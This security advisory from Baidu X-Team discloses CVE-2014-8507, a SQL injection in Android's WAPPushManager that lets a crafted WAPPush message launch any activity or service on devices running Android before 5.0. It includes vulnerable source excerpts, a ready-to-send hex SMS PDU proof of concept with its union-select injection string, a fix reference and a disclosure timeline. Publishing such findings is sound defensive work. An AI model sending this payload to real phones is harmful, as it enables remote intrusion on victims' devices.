INTRODUCTION
==================================
In Android <5.0, a SQL injection vulnerability exists in the opt module WAPPushManager, attacker can remotely send malformed WAPPush message to launch any activity or service in the victim's phone (need permission check)

DETAILS
==================================
When a WAPPush message is received, the raw pdu is processed by dispatchWapPdu method in com\android\internal\telephony\WapPushOverSms.java

Here the pdu is parsed to get the contentType & wapAppId:

            String mimeType = pduDecoder.getValueString();
            ...
            /**
             * Seek for application ID field in WSP header.
             * If application ID is found, WapPushManager substitute the message
             * processing. Since WapPushManager is optional module, if WapPushManager
             * is not found, legacy message processing will be continued.
             */
            if (pduDecoder.seekXWapApplicationId(index, index + headerLength - 1)) {
                index = (int) pduDecoder.getValue32();
                pduDecoder.decodeXWapApplicationId(index);
                String wapAppId = pduDecoder.getValueString();
                if (wapAppId == null) {
                    wapAppId = Integer.toString((int) pduDecoder.getValue32());
                }
                String contentType = ((mimeType == null) ?
                        Long.toString(binaryContentType) : mimeType);
                if (DBG) Rlog.v(TAG, "appid found: " + wapAppId + ":" + contentType);

The wapAppId & contentType can be literal string embeded in the pdu, to prove this, we can launch Android 4.4 emulator and send sms pdu by telnet console

Type the following command in telnet console:

sms pdu 0040000B915121551532F40004800B05040B84C0020003F001010A065603B081EAAF2720756e696f6e2073656c65637420302c27636f6d2e616e64726f69642e73657474696e6773272c27636f6d2e616e64726f69642e73657474696e67732e53657474696e6773272c302c302c302d2d200002066A008509036D6F62696C65746964696E67732E636F6D2F0001

And watch the radio logcat message in emulator, it prints out the extracted malicious appid:
' union select 0,'com.android.settings','com.android.settings.Settings',0,0,0--

However, since the WAPPushManager is optional, it is not installed in the emulator, so it then prints "wap push manager not found!"

But if the WAPPushManager is installed, the extracted wapAppId & contentType will be send to its method processMessage:

                try {
                    boolean processFurther = true;
                    IWapPushManager wapPushMan = mWapPushManager;
                    if (wapPushMan == null) {
                        if (DBG) Rlog.w(TAG, "wap push manager not found!");
                    } else {
                        Intent intent = new Intent();
                        intent.putExtra("transactionId", transactionId);
                        intent.putExtra("pduType", pduType);
                        intent.putExtra("header", header);
                        intent.putExtra("data", intentData);
                        intent.putExtra("contentTypeParameters",
                                pduDecoder.getContentParameters());
                        int procRet = wapPushMan.processMessage(wapAppId, contentType, intent);

So we go on checking the  source code of WAPPushManager:

https://android.googlesource.com/platform/frameworks/base/+/android-4.4.4_r2.0.1/packages/WAPPushManager/

In the method processMessage, the app_id and content_type is used in the method queryLastApp:

        public int processMessage(String app_id, String content_type, Intent intent)
            throws RemoteException {
            Log.d(LOG_TAG, "wpman processMsg " + app_id + ":" + content_type);
            WapPushManDBHelper dbh = getDatabase(mContext);
            SQLiteDatabase db = dbh.getReadableDatabase();
            WapPushManDBHelper.queryData lastapp = dbh.queryLastApp(db, app_id, content_type);
            db.close();

Then in the method queryLastApp, both app_id and content_type is concatenated without any escaping to build the rawQuery sql input,

        protected queryData queryLastApp(SQLiteDatabase db,
                String app_id, String content_type) {
            String sql = "select install_order, package_name, class_name, "
                    + " app_type, need_signature, further_processing"
                    + " from " + APPID_TABLE_NAME
                    + " where x_wap_application=\'" + app_id + "\'"
                    + " and content_type=\'" + content_type + "\'"
                    + " order by install_order desc";
            if (DEBUG_SQL) Log.v(LOG_TAG, "sql: " + sql);
            Cursor cur = db.rawQuery(sql, null);

Obviously, this is a SQL injection, for example, if app_id is as follows:
' union select 0,'com.android.settings','com.android.settings.Settings',0,0,0--

Then the package_name & class_name of query result would be:
"com.android.settings" and "com.android.settings.Setttings"

OK, then we return back to the method processMessage of WAPPushManager
The appType, packageName, className is fully controllable, which will be used to set the component of an intent to start a activity or service
That means, attacker can remotely launch any activity or service by construct malformed WAPPush Message (need permission check)

            if (lastapp.appType == WapPushManagerParams.APP_TYPE_ACTIVITY) {
                //Intent intent = new Intent(Intent.ACTION_MAIN);
                intent.setClassName(lastapp.packageName, lastapp.className);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try {
                    mContext.startActivity(intent);
                } catch (ActivityNotFoundException e) {
                    Log.w(LOG_TAG, "invalid name " +
                            lastapp.packageName + "/" + lastapp.className);
                    return WapPushManagerParams.INVALID_RECEIVER_NAME;
                }
            } else {
                intent.setClassName(mContext, lastapp.className);
                intent.setComponent(new ComponentName(lastapp.packageName,
                        lastapp.className));
                if (mContext.startService(intent) == null) {
                    Log.w(LOG_TAG, "invalid name " +
                            lastapp.packageName + "/" + lastapp.className);
                    return WapPushManagerParams.INVALID_RECEIVER_NAME;
                }
            }

This has been fixed in android 5.0 (android bug id 17969135)
https://android.googlesource.com/platform/frameworks/base/+/48ed835468c6235905459e6ef7df032baf3e4df6

TIMELINE
==================================
11.10.2014 Initial report to Android Security Team with the POC
14.10.2014 Reply from Android Security Team "are looking into it"
04.11.2014 Android 5.0 source code is open, the fix for this issue is found in change log, request status update
08.11.2014 Reply from Android Security Team "have fixed the issue in L (which is now in AOSP) and have provided patches to partners"
09.11.2014 Contact MITRE about this issue
17.11.2014 CVE-2014-8507 assigned
26.11.2014 Public Disclosure

IDENTIFIERS
==================================
CVE-2014-8507
Android id 17969135

CREDITS
==================================
WangTao (neobyte) of Baidu X-Team
WangYu of Baidu X-Team
Zhang Donghui of Baidu X-Team

--
BAIDU X-TEAM (xteam.baidu.com)
An external link of this advisory can be found at http://xteam.baidu.com/?p=167